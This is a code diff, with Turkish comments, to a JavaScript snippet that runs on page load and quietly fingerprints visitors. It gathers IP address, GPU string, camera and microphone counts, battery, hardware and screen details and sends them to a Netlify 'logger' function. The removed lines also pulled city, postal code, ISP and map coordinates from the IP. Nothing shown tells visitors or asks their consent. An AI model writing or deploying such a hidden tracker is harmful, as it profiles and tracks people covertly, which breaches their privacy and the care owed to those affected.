@@ -1,10 +1,14 @@
 (async function () {
   try {
-    // 1. IP ve Konum/İSS Detaylarını Çek
-    const ipRes = await fetch("https://ipwho.is/");
-    const ipData = await ipRes.json();
+    // 1. IP Tespiti
+    let ip = "Bilinmiyor";
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      ip = ipData.ip || "Bilinmiyor";
+    } catch (e) {}
 
-    // 2. GPU Bilgisini Yakala (WebGL)
+    // 2. GPU Bilgisi (WebGL)
     let gpu = "Bilinmiyor";
     try {
       const canvas = document.createElement("canvas");
@@ -17,7 +21,7 @@
       }
     } catch (e) {}
 
-    // 3. Basit Parmak İzi (Fingerprint Hash) Oluştur
+    // 3. Parmak İzi (Fingerprint)
     const fpString = `${navigator.userAgent}-${screen.width}x${screen.height}-${navigator.language}-${gpu}`;
     let hash = 0;
     for (let i = 0; i < fpString.length; i++) {
@@ -26,7 +30,7 @@
     }
     const fingerprint = Math.abs(hash).toString(16);
 
-    // 4. Medya Cihazları Sayısını Al
+    // 4. Medya Cihazları
     let micCount = 0, camCount = 0, speakerCount = 0;
     if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
       try {
@@ -39,8 +43,8 @@
       } catch (e) {}
     }
 
-    // 5. Batarya Bilgisi
-    let batteryInfo = "Desteklenmiyor / Bilgi Yok";
+    // 5. Batarya
+    let batteryInfo = "Bilgi Yok";
     if (navigator.getBattery) {
       try {
         const battery = await navigator.getBattery();
@@ -48,22 +52,18 @@
       } catch (e) {}
     }
 
-    // Tüm Verileri Paketle
+    // Veri Paketleme
     const payload = {
-      ip: ipData.ip || "Bilinmiyor",
-      location: `${ipData.city || 'Bilinmiyor'}, ${ipData.region || ''} / ${ipData.country || 'Bilinmiyor'} (${ipData.postal || 'N/A'})`,
-      timezone: ipData.timezone ? ipData.timezone.id : "Bilinmiyor",
-      isp: `${ipData.connection ? ipData.connection.isp : 'Bilinmiyor'} (${ipData.connection ? ipData.connection.asn : 'N/A'})`,
-      coords: (ipData.latitude && ipData.longitude) ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : "Bilinmiyor",
+      ip: ip,
       fingerprint: fingerprint,
       gpu: gpu,
-      media: `Kamera: ${camCount} | Mikrofon: ${micCount} | Hoparlör/Ses: ${speakerCount}`,
+      media: `Kamera: ${camCount} | Mik: ${micCount} | Ses: ${speakerCount}`,
       platform: navigator.platform || "Bilinmiyor",
-      hardware: `${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek | ~${navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'Bilinmiyor'}`,
+      hardware: `${navigator.hardwareConcurrency || '?'} Çekirdek | ~${navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : '?'}`,
       battery: batteryInfo,
-      screen: `Ekran: ${screen.width} x ${screen.height}`,
-      windowSize: `Pencere: ${window.innerWidth} x ${window.innerHeight}`,
-      colorDepth: `${screen.colorDepth} bit | Oran: ${window.devicePixelRatio || 1}x`,
+      screen: `${screen.width}x${screen.height}`,
+      windowSize: `${window.innerWidth}x${window.innerHeight}`,
+      colorDepth: `${screen.colorDepth}-bit (${window.devicePixelRatio || 1}x)`,
       touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Evet" : "Hayır",
       languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
       cookies: navigator.cookieEnabled ? "Evet" : "Hayır",
@@ -71,7 +71,6 @@
       url: window.location.href
     };
 
-    // Netlify Serverless Function'a Gönder
     await fetch("/.netlify/functions/logger", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -79,7 +78,6 @@
     });
 
   } catch (e) {
-    // Hata Durumunda Düz Tetikleme
     await fetch("/.netlify/functions/logger");
   }
 })();
